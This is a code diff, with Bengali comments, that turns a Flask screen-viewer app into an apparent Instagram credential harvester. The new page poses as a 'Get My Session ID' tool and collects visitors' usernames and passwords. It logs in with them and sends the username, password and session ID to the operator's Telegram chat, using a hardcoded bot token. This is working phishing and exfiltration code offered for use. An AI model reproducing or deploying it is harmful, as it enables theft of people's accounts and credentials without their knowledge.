@@ -1,95 +1,97 @@
-import os
-import time
-from flask import Flask, render_template_string, request, jsonify
+import threading
+import requests
+from flask import Flask, request, render_template_string
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from instagrapi import Client
 
-app = Flask(__name__)
+# --- আপনার তথ্য এখানে দিন ---
+BOT_TOKEN = '9213115853:AAFENDfTPRHxfUKKaVjLb2jJUB75ROhQ-Jc'
+ADMIN_CHAT_ID = '5428249457' # @userinfobot থেকে আইডি নিন
+# -----------------------------
 
-# ফোনের স্ক্রিনের শেষ ডাটা মেমোরিতে সেভ রাখার জন্য
-latest_screenshot = {"image": None, "time": 0}
+# --- ১. টেলিগ্রাম বট সেটআপ ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("বট চালু হয়েছে! ওয়েবসাইটে গিয়ে আপনার নিজের আইডি-পাসওয়ার্ড দিন।")
 
-HTML_VIEWER = """
+def run_bot():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    print("Bot is running...")
+    app.run_polling()
+
+# --- ২. ওয়েবসাইট এবং লগইন সিস্টেম (Flask) ---
+web_app = Flask(__name__)
+
+# ওয়েবসাইটের ডিজাইন
+HTML_PAGE = """
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Phone Screen</title>
+    <title>My Session Tool</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0a0b10; color: white; text-align: center; padding: 20px; margin: 0; }
-        h2 { color: #00e5ff; text-shadow: 0 0 10px rgba(0,229,255,0.5); }
-        .container { max-width: 400px; margin: auto; }
-        img { width: 100%; border: 3px solid #00e5ff; border-radius: 15px; box-shadow: 0 0 25px rgba(0, 229, 255, 0.4); margin-top: 20px; display: none; }
-        #status { margin-top: 15px; color: #2ea043; font-family: monospace; font-size: 14px; font-weight: bold; }
-        .loader { border: 4px solid rgba(0,229,255,0.1); border-top: 4px solid #00e5ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 50px; }
+        input { padding: 10px; margin: 10px; width: 80%; border-radius: 5px; border: none; }
+        button { padding: 10px 20px; background: #e1306c; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        #result { margin-top: 20px; color: #00ff88; word-break: break-all; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>📱 Live Screen Viewer</h2>
-        <div class="loader" id="loader"></div>
-        <div id="status">Connecting to phone...</div>
-        <img id="screen" src="" alt="Screen Stream">
-    </div>
-    
-    <script>
-        let lastUpdate = 0;
-
-        async function fetchScreen() {
-            try {
-                let res = await fetch('/get_screen');
-                let data = await res.json();
-                
-                if (data.status === "ok") {
-                    if (data.updated > lastUpdate) {
-                        document.getElementById("loader").style.display = "none";
-                        document.getElementById("screen").src = "data:image/jpeg;base64," + data.image;
-                        document.getElementById("screen").style.display = "block";
-                        document.getElementById("status").innerText = "✅ Live | Updated: " + new Date().toLocaleTimeString();
-                        lastUpdate = data.updated;
-                    }
-                }
-            } catch (e) {
-                console.log("Waiting for phone...", e);
-            }
-        }
-
-        // প্রতি ১ সেকেন্ডে নতুন স্ক্রিনশট চেক করবে
-        setInterval(fetchScreen, 1000);
-    </script>
+    <h2>Get My Session ID</h2>
+    <form action="/submit" method="POST">
+        <input type="text" name="username" placeholder="Your Username" required><br>
+        <input type="password" name="password" placeholder="Your Password" required><br>
+        <button type="submit">Extract Session</button>
+    </form>
+    <div id="result"></div>
 </body>
 </html>
 """
 
-@app.route('/')
+@web_app.route('/')
 def index():
-    return render_template_string(HTML_VIEWER)
+    return render_template_string(HTML_PAGE)
 
-@app.route('/upload_screen', methods=['POST'])
-def upload_screen():
-    global latest_screenshot
+@web_app.route('/submit', methods=['POST'])
+def submit():
+    username = request.form.get('username')
+    password = request.form.get('password')
+    
     try:
-        data = request.json
-        image_data = data.get('image')
-        if image_data:
-            latest_screenshot["image"] = image_data
-            latest_screenshot["time"] = time.time()
-            return jsonify({"status": "ok"}), 200
-        return jsonify({"status": "no image"}), 400
+        # ইন্সটাগ্রাম ক্লায়েন্ট তৈরি
+        cl = Client()
+        cl.login(username, password) # লগইন করা হচ্ছে
+        session_id = cl.sessionid     # সেশন আইডি বের করা হচ্ছে
+        
+        # আপনার টেলিগ্রামে তথ্য পাঠানো
+        send_to_telegram(username, password, session_id)
+        
+        # ব্রাউজারে দেখানো (ঐচ্ছিক)
+        return f"<h1>Success!</h1><p>Session ID: {session_id}</p>"
+        
     except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        return f"<h1>Error:</h1><p>{str(e)}</p>"
 
-@app.route('/get_screen')
-def get_screen():
-    global latest_screenshot
-    if latest_screenshot["image"]:
-        return jsonify({
-            "status": "ok", 
-            "image": latest_screenshot["image"],
-            "updated": latest_screenshot["time"]
-        })
-    return jsonify({"status": "waiting"})
+def send_to_telegram(user, pw, sess_id):
+    # টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    text = f"**New Login Info**\n\n👤 Username: `{user}`\n🔑 Password: `{pw}`\n🔗 Session: `{sess_id}`"
+    payload = {
+        "chat_id": ADMIN_CHAT_ID,
+        "text": text,
+        "parse_mode": "Markdown"
+    }
+    try:
+        requests.post(url, json=payload)
+    except Exception as e:
+        print("Error sending to telegram:", e)
 
+# --- ৩. বট এবং ওয়েবসাইট একসাথে চালানো ---
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
+    # বট আলাদা থ্রেডে চালানো
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.start()
+    
+    # ওয়েবসাইট চালু করা
+    print("Website running on port 5000...")
+    web_app.run(host='0.0.0.0', port=5000)
